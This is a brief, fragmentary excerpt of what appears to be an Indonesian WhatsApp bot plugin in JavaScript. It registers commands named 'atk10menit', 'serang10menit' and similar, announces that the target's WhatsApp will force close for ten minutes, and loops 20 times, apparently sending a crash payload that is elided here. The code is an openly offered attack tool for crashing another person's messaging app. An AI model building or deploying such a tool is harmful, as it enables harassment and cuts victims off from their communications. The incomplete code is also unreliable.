...
Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 10 Menit Dari sekarang`)
for (let i = 0;i < 20;i++) {
...
handler.help = ['atk10menit']
handler.command = /^(atk10menit|santed10menit|serang10menit)$/i
